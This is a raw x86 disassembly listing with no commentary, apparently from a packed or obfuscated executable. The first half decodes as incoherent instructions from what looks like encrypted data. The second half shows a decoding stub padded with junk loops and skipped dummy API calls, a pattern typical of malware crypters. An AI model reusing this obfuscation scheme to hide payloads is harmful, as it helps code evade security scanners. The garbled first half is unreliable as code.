  411830:	xlat   BYTE PTR ds:[ebx]
  411831:	test   al,0xeb
  411833:	mov    bl,0xfc
  411835:	jmp    0xa9c:0x5f45060f
  41183c:	jmp    0x4118ad
  41183e:	xchg   ebp,eax
  41183f:	pop    esi
  411840:	and    BYTE PTR [esi-0x5f],dl
  411843:	dec    ebx
  411844:	jmp    0x4117cc
  411846:	inc    esp
  411847:	ins    BYTE PTR es:[edi],dx
  411848:	and    al,0x41
  41184a:	ror    BYTE PTR [eax+0x41afe36c],1
  411850:	add    DWORD PTR [edx+0x3caa180a],eax
  411856:	jne    0x411886
  411858:	add    dl,BYTE PTR [ecx+eax*8+0x57ed1738]
  41185f:	test   esp,ebp
  411861:	sbb    ebx,DWORD PTR [ecx]
  411863:	jno    0x411856
  411865:	ror    BYTE PTR [eax+ebp*1+0x42c8e199],1
  41186c:	pop    ecx
  41186d:	jne    0x411852
  41186f:	jge    0x411837
  411871:	and    eax,0x9087928d
  411876:	addr16 aad 0x6f
  411879:	mov    dl,0xe
  41187b:	shl    DWORD PTR [ebx],1
  41187d:	xor    DWORD PTR [ecx+0x24],eax
  411880:	mov    DWORD PTR [ecx-0x5f4c3fa1],edx
  411886:	mov    edx,0x6fa406de
  41188b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41188c:	call   0x9d1c:0x87f03c57
  411893:	push   ss
  411894:	mov    al,ds:0x87564b53
  411899:	or     eax,0x7bc31bdd
  41189e:	xor    DWORD PTR [edi],ebx
  4118a0:	push   edi
  4118a1:	pop    edx
  4118a2:	push   ebp
  4118a3:	jg     0x4118f9
  4118a5:	pop    edx
  4118a6:	adc    DWORD PTR [edi+0x9],ecx
  4118a9:	idiv   BYTE PTR [ecx]
  4118ab:	jge    0x411906
  4118ad:	xchg   edx,eax
  4118ae:	xor    BYTE PTR [esi-0x30078c9],0xe8
  4118b5:	or     eax,0x851b64fa
  4118ba:	cmove  eax,DWORD PTR [ebx+ebx*8+0x6]
  4118bf:	jb     0x411900
  4118c1:	xor    DWORD PTR [edi-0x53f0a2a5],ebx
  4118c7:	sar    BYTE PTR [ebx+0x5b512c11],1
  4118cd:	sub    bh,al
  4118cf:	mov    ebx,0x981ff404
  4118d4:	call   0x5549:0x27016a69
  4118db:	pushf  
  4118dc:	adc    DWORD PTR [ebx],ecx
  4118de:	out    0xd4,eax
  4118e0:	fisttp QWORD PTR [edx-0x24c25ce7]
  4118e6:	retf   0xd9fc
  4118e9:	rcr    esi,1
  4118eb:	cmp    al,0x31
  4118ed:	imul   esp,DWORD PTR [esi-0x4d83f6c6],0x7be3e01c
  4118f7:	rcr    DWORD PTR [edi-0x49014429],cl
  4118fd:	jnp    0x4118e5
  4118ff:	adc    eax,DWORD PTR [ecx+0x349817df]
  411905:	arpl   cx,cx
  411907:	loopne 0x41191c
  411909:	mov    ch,0xd0
  41190b:	xor    al,0x86
  41190d:	cmp    eax,0x61e4ac4b
  411912:	out    0xe6,eax
  411914:	xchg   edi,eax
  411915:	les    ebp,FWORD PTR [edi]
  411917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411918:	add    DWORD PTR [ebp-0x42],0xffffff84
  41191c:	popf   
  41191d:	mov    ds:0xb65ba317,eax
  411922:	lds    ebx,FWORD PTR [ecx]
  411924:	fcomp  QWORD PTR [eax+0x64e71486]
  41192a:	mov    ss,WORD PTR [ecx-0x38054260]
  411930:	js     0x41199b
  411932:	adc    esi,DWORD PTR [ebx]
  411934:	shl    dl,0xa2
  411937:	or     DWORD PTR [edi-0x77],ecx
  41193a:	sub    al,0x2a
  41193c:	jbe    0x41194d
  41193e:	shl    DWORD PTR [ebp-0x6],1
  411941:	mov    esp,0xcc423625
  411946:	pop    ebx
  411947:	jl     0x4118fd
  411949:	fist   WORD PTR [edx+0x33]
  41194c:	data16 stc 
  41194e:	jns    0x4119a3
  411950:	daa    
  411951:	sbb    eax,0x1b66f524
  411956:	xchg   BYTE PTR [ebx+ecx*8+0x9],bh
  41195a:	mov    ss,ebx
  41195c:	and    eax,0x7ea62f8f
  411961:	popf   
  411962:	jae    0x4119de
  411964:	fimul  WORD PTR [edx]
  411966:	(bad)  
  411967:	stos   DWORD PTR es:[edi],eax
  411968:	addr16 or al,0xee
  41196b:	rcl    dh,1
  41196d:	aas    
  41196e:	push   0x1f014e31
  411973:	add    BYTE PTR [ebx],bh
  411975:	jge    0x4118ff
  411977:	push   ds
  411978:	fcom   QWORD PTR [esi]
  41197a:	scas   eax,DWORD PTR es:[edi]
  41197b:	call   0x24c10cc0
  411980:	daa    
  411981:	xor    DWORD PTR [eax+0x3bc55431],eax
  411987:	pop    eax
  411988:	call   0xe50ed199
  41198d:	inc    ecx
  41198e:	jno    0x411998
  411990:	mov    al,BYTE PTR [eax-0x25359d8a]
  411996:	loop   0x4119f6
  411998:	adc    eax,0x390e04c9
  41199d:	and    bh,BYTE PTR [ecx-0x30]
  4119a0:	call   0x5b8be0ec
  4119a5:	inc    edx
  4119a6:	fcom   DWORD PTR [edi+0x6f3c1fe3]
  4119ac:	mov    ah,BYTE PTR [edi-0x79]
  4119af:	mov    dl,0xe9
  4119b1:	stc    
  4119b2:	int    0x79
  4119b4:	jl     0x4119b2
  4119b6:	cmp    DWORD PTR ds:0xfdc7a040,ebp
  4119bc:	push   ebx
  4119bd:	mov    al,ds:0x7b862c8
  4119c2:	and    eax,0x2861f5c4
  4119c7:	cli    
  4119c8:	in     al,dx
  4119c9:	(bad)  
  4119ca:	hlt    
  4119cb:	push   ebp
  4119cc:	popf   
  4119cd:	retf   0x5b1e
  4119d0:	or     bl,BYTE PTR [ecx+0x7b]
  4119d3:	sbb    BYTE PTR [esi-0x7a],0x97
  4119d7:	add    al,0x11
  4119d9:	aas    
  4119da:	mov    ecx,esp
  4119dc:	fild   WORD PTR [esi]
  4119de:	cwde   
  4119df:	retf   0x6c0d
  4119e2:	sub    cl,BYTE PTR gs:[esi-0x22]
  4119e6:	mov    ebp,0x23ea6d1
  4119eb:	test   DWORD PTR [edi],esp
  4119ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119ee:	ret    
  4119ef:	data16 jno 0x4119bc
  4119f2:	out    0x53,al
  4119f4:	mov    eax,ds:0xb9ed80e8
  4119f9:	jle    0x4119e9
  4119fb:	mov    esp,0x192cab75
  411a00:	jns    0x4119e1
  411a02:	ja     0x411a6e
  411a04:	(bad)  
  411a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a06:	jnp    0x41198f
  411a08:	xlat   BYTE PTR ds:[ebx]
  411a09:	mov    BYTE PTR [ebp-0x43e7765f],ah
  411a0f:	mov    ebp,0xeb63ed15
  411a14:	mov    esi,DWORD PTR [eax]
  411a16:	push   eax
  411a17:	mov    edx,0x6d2a7b7c
  411a1c:	div    esp
  411a1e:	inc    edi
  411a1f:	xchg   ebp,esi
  411a21:	jmp    0x411a35
  411a23:	loop   0x4119d6
  411a25:	mov    DWORD PTR [edx+0x10],ebx
  411a28:	(bad)  
  411a29:	jae    0x411a67
  411a2b:	or     dh,bl
  411a2d:	(bad)  
  411a2e:	dec    esp
  411a2f:	or     al,0x8f
  411a31:	sub    DWORD PTR [edi+edi*1+0x33],eax
  411a35:	ret    0x33d7
  411a38:	mov    ah,0x6e
  411a3a:	inc    esi
  411a3b:	dec    edx
  411a3c:	dec    ecx
  411a3d:	cmp    ah,ch
  411a3f:	out    0x14,al
  411a41:	and    WORD PTR [edi+0x3cc1e2c0],sp
  411a48:	(bad)  
  411a4a:	push   DWORD PTR [esi+0xe]
  411a4d:	jb     0x411a8c
  411a4f:	mov    BYTE PTR [edi+0x33f8a991],0xb0
  411a56:	cmp    eax,0x58342e51
  411a5b:	stc    
  411a5c:	mov    bh,0x1e
  411a5e:	pop    ebp
  411a5f:	pushf  
  411a60:	test   BYTE PTR [eax],0x1c
  411a63:	xchg   edi,eax
  411a64:	scas   al,BYTE PTR es:[edi]
  411a65:	push   ecx
  411a66:	mov    dl,0x73
  411a68:	sub    ch,BYTE PTR [esi]
  411a6a:	test   al,0xf7
  411a6c:	shr    BYTE PTR [edx+eiz*8+0x6e],0xe3
  411a71:	jno    0x411a7e
  411a73:	(bad)  
  411a75:	stos   BYTE PTR es:[edi],al
  411a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a77:	addr16 lahf 
  411a79:	fadd   DWORD PTR ds:0x2703bd04
  411a7f:	mov    ds:0x1cbbe2ce,al
  411a84:	or     DWORD PTR [ebp-0x22],esp
  411a87:	das    
  411a88:	mov    eax,ds:0x34e92a7b
  411a8d:	rcr    edx,1
  411a8f:	cwde   
  411a90:	fist   WORD PTR [eax]
  411a92:	es cmp al,dh
  411a95:	cli    
  411a96:	stos   DWORD PTR es:[edi],eax
  411a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a98:	mov    edx,0xee532e9f
  411a9d:	sub    DWORD PTR [ebx],esp
  411a9f:	in     eax,dx
  411aa0:	popa   
  411aa1:	(bad)  
  411aa2:	rol    BYTE PTR [edx+0x50170c6e],cl
  411aa8:	mov    dh,0xb9
  411aaa:	or     eax,0x1fefb373
  411aaf:	jae    0x411a40
  411ab1:	sub    ebp,DWORD PTR [edi]
  411ab3:	and    cl,ah
  411ab5:	ficomp WORD PTR ds:0xb48c0bb1
  411abb:	(bad)  
  411abc:	mov    al,0x3e
  411abe:	test   eax,0x33a1032d
  411ac4:	je     0x411b07
  411ac6:	add    al,0x48
  411ac8:	cmp    cl,BYTE PTR [esi+edx*1-0xd0cd57b]
  411acf:	xor    esi,ecx
  411ad1:	or     al,BYTE PTR [eax]
  411ad3:	push   ss
  411ad4:	lods   al,BYTE PTR ds:[esi]
  411ad5:	lods   al,BYTE PTR ds:[esi]
  411ad6:	push   edi
  411ad7:	mov    al,0x28
  411ad9:	daa    
  411ada:	pushf  
  411adb:	lahf   
  411adc:	stos   BYTE PTR es:[edi],al
  411add:	inc    edi
  411ade:	xor    DWORD PTR [edx],edi
  411ae0:	clc    
  411ae1:	inc    ebx
  411ae2:	mov    dh,0xf9
  411ae4:	rcl    DWORD PTR [esi-0x68],1
  411ae7:	or     DWORD PTR [ebx],esp
  411ae9:	lods   al,BYTE PTR ds:[esi]
  411aea:	scas   eax,DWORD PTR es:[edi]
  411aeb:	xchg   ebp,eax
  411aec:	xor    ax,0x6e89
  411af0:	gs test eax,0x24e55457
  411af6:	jno    0x411a82
  411af8:	mov    esi,0x20b2082d
  411afd:	into   
  411afe:	pop    ds
  411aff:	cli    
  411b00:	pusha  
  411b01:	mov    eax,DWORD PTR [ecx]
  411b03:	call   0x8c2:0x757d6d7d
  411b0a:	pop    esi
  411b0b:	cmp    ebp,DWORD PTR [ebp-0x64]
  411b0e:	loope  0x411ad0
  411b10:	into   
  411b11:	pop    ds
  411b12:	xchg   edi,eax
  411b13:	mov    eax,0x292572d6
  411b18:	dec    esi
  411b19:	std    
  411b1a:	bnd jle 0x411b6c
  411b1d:	pop    edi
  411b1e:	repz ss retf 
  411b21:	cmp    DWORD PTR [ebx-0x6b7d1ec3],edx
  411b27:	pushf  
  411b28:	cmp    BYTE PTR [edx+0x40bf3cbb],bh
  411b2e:	add    DWORD PTR ds:[esi],edi
  411b31:	loope  0x411b8f
  411b33:	jmp    0xa4d5:0xe5cb325a
  411b3a:	pop    es
  411b3b:	out    0x6a,al
  411b3d:	add    BYTE PTR [ebp+0x3cf0d25d],dl
  411b43:	scas   eax,DWORD PTR es:[edi]
  411b44:	icebp  
  411b45:	popf   
  411b46:	in     al,dx
  411b47:	xchg   ebx,eax
  411b48:	dec    ebx
  411b49:	retf   
  411b4a:	rcl    DWORD PTR [eax-0x78],1
  411b4d:	ret    0xd5a5
  411b50:	pop    esi
  411b51:	or     eax,DWORD PTR [bx+di+0x60]
  411b55:	leave  
  411b56:	cld    
  411b57:	imul   ebp,DWORD PTR [edx-0x5d],0xffffff86
  411b5b:	cdq    
  411b5c:	lds    ecx,FWORD PTR [ebp-0x4a660434]
  411b62:	push   ebp
  411b63:	inc    edx
  411b64:	push   eax
  411b65:	js     0x411b97
  411b67:	push   es
  411b68:	cmp    al,0x80
  411b6a:	dec    esp
  411b6b:	jecxz  0x411b05
  411b6d:	mov    BYTE PTR [ecx+0x340d6fa7],cl
  411b73:	pop    esi
  411b74:	mov    ch,BYTE PTR [ecx]
  411b76:	idiv   al
  411b78:	shl    BYTE PTR [esi+0x56],1
  411b7b:	test   eax,0x1252a58d
  411b80:	leave  
  411b81:	xchg   ebp,eax
  411b82:	divps  xmm6,xmm4
  411b85:	cmp    ecx,DWORD PTR [ecx+ebx*4]
  411b88:	push   ebx
  411b89:	add    bh,BYTE PTR [edi+0x5]
  411b8c:	and    bl,BYTE PTR [esi]
  411b8e:	jg     0x411b21
  411b90:	hlt    
  411b91:	dec    edi
  411b92:	xchg   ebp,eax
  411b93:	add    bl,cl
  411b95:	ins    BYTE PTR es:[edi],dx
  411b96:	out    0xdc,eax
  411b98:	sti    
  411b99:	xor    DWORD PTR [edx],edi
  411b9b:	fld    TBYTE PTR [ecx]
  411b9d:	jmp    0xa50c9b89
  411ba2:	mov    edx,0xbbb39086
  411ba7:	push   ss
  411ba8:	xor    BYTE PTR [esi-0x19],ch
  411bab:	rcl    BYTE PTR [ebx+0x4a7adb91],cl
  411bb1:	mov    edi,0x5c2f7ea3
  411bb6:	inc    edi
  411bb7:	dec    esi
  411bb8:	enter  0x5566,0x3e
  411bbc:	push   esp
  411bbd:	ins    BYTE PTR es:[edi],dx
  411bbe:	sbb    eax,0x6cf3dafd
  411bc3:	cmp    al,0xcc
  411bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bc6:	sub    al,0xb8
  411bc8:	and    BYTE PTR [di],0x30
  411bcc:	and    BYTE PTR [eax-0x48],cl
  411bcf:	(bad)  
  411bd0:	push   esp
  411bd1:	test   DWORD PTR [edi-0x3b],eax
  411bd4:	or     BYTE PTR [esi-0x69168a96],0xa3
  411bdb:	sti    
  411bdc:	xchg   esp,eax
  411bdd:	js     0x411c2d
  411bdf:	sub    esp,DWORD PTR [esi+ebx*4]
  411be2:	in     al,dx
  411be3:	fsubr  QWORD PTR [ebp-0x45]
  411be6:	jmp    0x11c5bf9a
  411beb:	enter  0x41c2,0x48
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
